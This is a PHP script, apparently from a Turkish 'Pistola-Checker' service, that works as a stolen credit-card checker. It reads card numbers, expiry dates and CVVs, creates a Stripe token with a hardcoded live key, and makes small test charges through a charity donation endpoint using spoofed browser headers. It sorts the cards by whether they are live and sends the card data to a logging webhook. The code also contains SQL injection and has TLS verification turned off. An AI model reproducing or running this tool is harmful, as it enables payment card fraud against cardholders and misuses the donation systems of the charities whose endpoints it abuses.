<?php


include_once '../includes/baglan.php';

session_start();


require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$SESSNICK = $_SESSION['GET_USER_SSID'];

                                        $SESSQRY = $db->query("SELECT * FROM users WHERE token = '$SESSNICK'");

                                        while ($SESSDATA = $SESSQRY->fetch()) {
                                            $edituser = $SESSDATA['username']; $profileimgx = $SESSDATA['profile_image'];
											$profileimgx = $SESSDATA['profile_image'];
                                        }

$webhookurl = "";

$json_data = json_encode(
    ["content" => "tarafından cc checker işlemi başlatıldı! $cc $mes $ano $cvv","username" => "$edituser","avatar_url" => "$profileimgx","tts" => false], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

curl_close( $ch );

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//



//=======================[Proxys END]=============================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-gpc: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36';
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=114270&pasted_fields=cvc%2Cnumber&guid=b0331856-c5ab-4579-a7e7-10bfc3a7d36c86a61f&muid=ff0d57d8-b470-472b-863a-ab41997fd9085e56c4&sid=ab1132d1-9706-4946-b567-b3404c0885bc05139b&key=pk_live_Reu0iyvtI4irr4oHuGKWz3v2&payment_user_agent=stripe.js%2F78ef418&card[name]=emre&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');


$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"'))); 
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.avaaz.org/donate/DonationStripeSubmit.php?preview=yes');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'cache-control: no-cache';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://equalitytexarkana.org';
$headers[] = 'pragma: no-cache';
$headers[] = 'referer: https://equalitytexarkana.org/donate-to-equality-texarkana/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-gpc: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: secure.avaaz.org',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Referer: https://secure.avaaz.org/donate/pub-iframe.php/?cid=3116&lang=es&sourceUrl=https%3A%2F%2Fsecure.avaaz.org%2Fes%2Fdonate%2F',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With: XMLHttpRequest',
'Connection: keep-alive'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'sourceUrl=https%3A%2F%2Fsecure.avaaz.org%2Fes%2Fdonate%2F&cid=3116&pa=0&lang=es&apiKey=&amount=10&currency=USD&amountOtherInput=&donationType=1&firstName='.$nombre.'&lastName='.$apellido.'&Email='.$email.'&CountryID=81&zip=10001&Address=&city=&paymentType=creditcard&paymentFamily=cc&paymentCardType=&stripeToken='.$token.'&stripeGatewayId=30&supports_history_api=true&secure_validation=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&used_js=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&privacy_policy_text=%3Ca+href%3D%22https%3A%2F%2Fwww.avaaz.org%2Fes%2Fprivacy%22+target%3D%22_blank%22%3EAvaaz+proteger%C3%A1+tu+privacidad%3C%2Fa%3E+y+te+mantendr%C3%A1+al+corriente+de+esta+y+otras+campa%C3%B1as.&privacy_policy_version=');
$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//

//===========================================[Responses]========================================//

if(strpos($result2, 'Do Not Honor')){
echo '<span class="badge badge-success">[ %50!] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Bu Kart Sorgulanamiyor %50 ihtimal ile aktif!</span>';
}


elseif(strpos($result2, 'incorrect_number')){

echo '<span class="badge badge-success">? #Reddedildi </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Kart Numarasi Hatali - Pistola-Checker.CC</span>';
}
elseif(strpos($result2, 'Processor Declined')){
$POST = [ 'username' => 'ALLAH CC LOGGER', 'content' => '%50 : ' . $lista . 'Islem banka tarafindan onaylandi = ' ];

echo '<span class="badge badge-success">[ %50!] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Bu Kart Sorgulanamiyor %50 ihtimal ile aktif!</span>';
}
elseif(strpos($result2, 'Card Issuer Declined CVV')){

echo '<span class="badge badge-success">[ %50!] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Kart Sorgulandi Ancak Bakiye Yetersiz!</span>';
}
elseif(strpos($result2, 'Insufficient Funds')){
$POST = [ 'username' => 'ALLAH CC LOGGER', 'content' => '%50 : ' . $lista . 'Yetersiz Bakiye - Pistola-Checker.CC ' ];

echo '<span class="badge badge-info">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Kartinizda Yeterli Bakiye Bulunmamaktadir!  - Pistola-Checker.CC</span>';
}
elseif(strpos($result1, 'This transaction requires authentication')){
echo '<span class="badge badge-info">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Onaylandi!  - Pistola-Checker.CC</span>';
}
elseif(strpos($result1, 'success: true')){

echo '<span class="badge badge-info">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Odeme Islemi Onaylandi!  - Pistola-Checker.CC</span>';
}
elseif(strpos($result1, 'Payment Successful!')){

echo '<span class="badge badge-info">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Odeme Islemi Onaylandi!  - Pistola-Checker.CC</span>';
}

elseif(strpos($result1, 'Payment Successful!')){
echo '<span class="badge badge-info">✅ #Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Ödeme İşlemi Onaylandı! | PistolaSystem Services | - Pistola-Checker.CC</span>';
}


elseif(strpos($result2, 'Payment Successful!')){

echo '<span class="badge badge-info">✅ #Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Ödeme İşlemi Onaylandı! | PistolaSystem Services | - Pistola-Checker.CC</span>';
}





elseif(strpos($result1, 'security code is incorrect.')){
echo '<span class="badge badge-info">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Kartiniz Aktif Fakat CVV Kodu Hatali!  - Pistola-Checker.CC</span>';
}




elseif(strpos($result1, 'Your card does not support this type of purchase.')){
$POST = [ 'username' => 'ALLAH CC LOGGER', 'content' => '#Aktif : ' . $lista . ' YD KAPALI Kartiniz Onaylandi - Pistola-Checker.CC ' ];

echo '<span class="badge badge-info">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Onaylandi!  - Pistola-Checker.CC</span>';
}


elseif(strpos($result1, '"cvc_check": "unchecked"')){
echo '❌ #Decline | Ödeme başarısız | '.$lista.'  ' . $bank . '';
}

elseif ((strpos($result2, "Thank ")) || (strpos($result2, "Success ")) || (strpos($result2, "succeeded"))){ 
$POST = [ 'username' => 'ALLAH CC LOGGER', 'content' => 'Live : ' . $lista . 'Yetersiz Bakiye - Pistola-Checker.CC ' ];

echo '<span class="badge badge-success">#Aktif </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  ODEME ISLEMI ONAYLANDI!  - Pistola-Checker.CC</span>';
}
elseif(strpos($result2, 'Transaction Not Allowed')){
echo '<span class="badge badge-success">? #Reddedildi </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Bu Kart Calinti Olabilir</span>';
}
elseif(strpos($result2, 'Declined')){
echo '<span class="badge badge-success">? #Reddedildi </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Kartiniz Reddedildi!  - Pistola-Checker.CC</span>';
}
elseif(strpos($result2, 'Invalid Credit Card Number')){
echo '<span class="badge badge-success">? #Reddedildi </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Hatali Kart Numarasi! - Pistola-Checker.CC</span>';
}
elseif(strpos($result2, 'expiration year is invalid')){
echo '<span class="badge badge-success">? #Reddedildi </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Son Kullanim Tarihi Dolmus Olan Kart - Pistola-Checker.CC</span>';
}





elseif(strpos($result1, 'success":false')){

echo '<span class="badge badge-success">? #Reddedildi </span><span class="badge badge-info">'.$lista.'</span><span class="badge badge-info"> |  ' . $bank . '  |  Genel Red - Pistola-Checker.CC  </span>';

}


elseif(!$result2){
echo '❌ #Bilinmiyor | '.$lista.' |  ' . $bank . '  |  Gate 2 hatası ticket üzerinden bildirin.</span>';
}


else{
echo '❌ #Reddedildi | '.$lista.' |  Ödeme işlemi başarısız!</span>';
}


//===========================================[Responses-END]========================================//

curl_close($ch);
ob_flush();
?>